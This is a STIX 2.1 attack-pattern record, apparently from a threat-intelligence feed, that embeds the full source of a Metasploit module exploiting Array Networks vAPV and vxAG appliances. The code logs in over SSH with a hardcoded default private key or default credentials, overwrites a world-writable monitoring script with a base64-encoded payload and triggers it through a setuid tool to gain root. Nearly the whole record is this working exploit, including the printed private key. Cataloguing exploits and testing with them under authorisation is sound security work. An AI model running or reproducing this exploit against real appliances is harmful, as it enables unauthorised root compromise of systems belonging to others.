{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b2bd4b3a-e005-4c86-84d4-397748c883e9",
    "created": "2024-08-14T17:14:23.911205Z",
    "modified": "2024-08-14T17:14:23.911209Z",
    "name": "Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution",
    "description": " This module exploits a default hardcoded private SSH key or default hardcoded login and password in the vAPV 8.3.2.17 and vxAG 9.2.0.34 appliances made by Array Networks. After logged in as the unprivileged user, it's possible to modify the world-writable file /ca/bin/monitor.sh with attacker-supplied arbitrary code. Execution is possible by using the backend tool, running setuid, to turn the debug monitoring on. This makes it possible to trigger a payload with root privileges.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/ssh/array_vxag_vapv_privkey_privesc.rb",
            "external_id": "array_vxag_vapv_privkey_privesc.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Array Networks vAPV and vxAG Private Key Privilege Escalation Code Execution',\n        'Description' => %q{\n          This module exploits a default hardcoded private SSH key or default hardcoded\n          login and password in the vAPV 8.3.2.17 and vxAG 9.2.0.34 appliances made\n          by Array Networks. After logged in as the unprivileged user, it's possible to modify\n          the world-writable file /ca/bin/monitor.sh with attacker-supplied arbitrary code.\n          Execution is possible by using the backend tool, running setuid, to turn the debug\n          monitoring on. This makes it possible to trigger a payload with root privileges.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'xistence <xistence[at]0x90.nl>', # Original discovery and Metasploit module\n        ],\n        'References' => [\n          ['OSVDB', '104652'],\n          ['OSVDB', '104653'],\n          ['OSVDB', '104654'],\n          ['PACKETSTORM', '125761']\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Payload' => {\n          'Compat' =>\n                  {\n                    'PayloadType' => 'cmd',\n                    'RequiredCmd' => 'generic telnet'\n                  }\n        },\n        'Targets' => [\n          ['vAPV 8.3.2.17 / vxAG 9.2.0.34', {}],\n        ],\n        'Privileged' => true,\n        'DisclosureDate' => '2014-02-03',\n        'DefaultTarget' => 0\n      )\n    )\n\n    register_options(\n      [\n        Opt::RHOST(),\n        Opt::RPORT(22),\n        OptBool.new('SSHKEY', [ true, 'Use SSH key instead of password', true]),\n        OptString.new('USER', [ true, 'vAPV/vxAG SSH user', 'sync']),\n        OptString.new('PASS', [ true, 'vAPV/vxAG SSH password', 'click1'])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [ false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def login_key(user)\n    print_status(\"#{rhost}:#{rport} - Attempt to login with '#{user}:SSH PRIVATE KEY'\")\n\n    key_data = \"-----BEGIN DSA PRIVATE KEY-----\\n\"\n    key_data += \"MIIBugIBAAKBgQCUw7F/vKJT2Xsq+fIPVxNC/Dyk+dN9DWQT5RO56eIQasd+h6Fm\\n\"\n    key_data += \"q1qtQrJ/DOe3VjfUrSm7NN5NoIGOrGCSuQFthFmq+9Lpt6WIykB4mau5iE5orbKM\\n\"\n    key_data += \"xTfyu8LtntoikYKrlMB+UrmKDidvZ+7oWiC14imT+Px/3Q7naj0UmOrSTwIVAO25\\n\"\n    key_data += \"Yf3SYNtTYv8yzaV+X9yNr/AfAoGADAcEh2bdsrDhwhXtVi1L3cFQx1KpN0B07JLr\\n\"\n    key_data += \"gJzJcDLUrwmlMUmrXR2obDGfVQh46EFMeo/k3IESw2zJUS58FJW+sKZ4noSwRZPq\\n\"\n    key_data += \"mpBnERKpLOTcWMxUyV8ETsz+9oz71YEMjmR1qvNYAopXf5Yy+4Zq3bgqmMMQyM+K\\n\"\n    key_data += \"O1PdlCkCgYBmhSl9CVPgVMv1xO8DAHVhM1huIIK8mNFrzMJz+JXzBx81ms1kWSeQ\\n\"\n    key_data += \"OC/nraaXFTBlqiQsvB8tzr4xZdbaI/QzVLKNAF5C8BJ4ScNlTIx1aZJwyMil8Nzb\\n\"\n    key_data += \"+0YAsw5Ja+bEZZvEVlAYnd10qRWrPeEY1txLMmX3wDa+JvJL7fmuBgIUZoXsJnzs\\n\"\n    key_data += \"+sqSEhA35Le2kC4Y1/A=\\n\"\n    key_data += \"-----END DSA PRIVATE KEY-----\\n\"\n\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['publickey'],\n      port: rport,\n      key_data: key_data\n    })\n\n    opts\n  end\n\n  def login_user_pass(user, pass)\n    print_status(\"#{rhost}:#{rport} - Attempting to login with '#{user}:#{pass}'\")\n    factory = ssh_socket_factory\n    opts = {\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      use_agent: false,\n      config: true,\n      password: pass,\n      proxy: factory,\n      non_interactive: true,\n      verify_host_key: :never\n    }\n\n    opts\n  end\n\n  def build_command\n    mon_temp = rand_text_alphanumeric(10)\n    cmd = Rex::Text.encode_base64('nohup ' + payload.encoded)\n    # Turn debug monitoring off, just in case it's turned on\n    command = '/ca/bin/backend -c \"debug monitor off\"`echo -e \"\\0374\"`;'\n    # Copy the data from monitor.sh to a random tmp file\n    command += \"cat /ca/bin/monitor.sh > /tmp/#{mon_temp};\"\n    # Insert our base64 encoded payload in to the world writable /ca/bin/monitor.sh file\n    command += \"/usr/bin/perl -MMIME::Base64 -le 'print decode_base64(\\\"#{cmd}\\\")' > /ca/bin/monitor.sh;\"\n    # Turn debug monitoring on, which will start the monitor.sh and thus our payload\n    command += '/ca/bin/backend -c \"debug monitor on\"`echo -e \"\\0374\"`;'\n    # Copy monitor.sh data back\n    command += \"cat /tmp/#{mon_temp} > /ca/bin/monitor.sh\"\n\n    command\n  end\n\n  # def execute_command(cmd, opts)\n  def exploit\n    user = datastore['USER']\n    pass = datastore['PASS']\n\n    if datastore['SSHKEY']\n      opts = login_key(user)\n    else\n      opts = login_user_pass(user, pass)\n    end\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, user, opts)\n      end\n    rescue Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{rhost}:#{rport} SSH - Connection error or address in use\")\n    rescue Net::SSH::Disconnect, ::EOFError\n      fail_with(Failure::Disconnected, \"#{rhost}:#{rport} SSH - Disconnected during negotiation\")\n    rescue ::Timeout::Error\n      fail_with(Failure::TimeoutExpired, \"#{rhost}:#{rport} SSH - Timed out during negotiation\")\n    rescue Net::SSH::AuthenticationFailed\n      fail_with(Failure::NoAccess, \"#{rhost}:#{rport} SSH - Failed authentication\")\n    rescue Net::SSH::Exception => e\n      fail_with(Failure::Unknown, \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\")\n    end\n\n    fail_with(Failure::Unknown, \"#{rhost}:#{rport} SSH session couldn't be established\") unless ssh\n\n    if datastore['SSHKEY']\n      print_good(\"#{rhost}:#{rport} - Login Successful (#{user}:SSH PRIVATE KEY)\")\n    else\n      print_good(\"#{rhost}:#{rport} - Login Successful (#{user}:#{pass})\")\n    end\n\n    # Make the SSH connection and execute our commands + payload\n    print_status(\"#{rhost}:#{rport} - Sending and executing payload to gain root privileges!\")\n    Net::SSH::CommandStream.new(ssh, build_command)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-02-03",
    "x_mitre_platforms": [
        "unix'"
    ]
}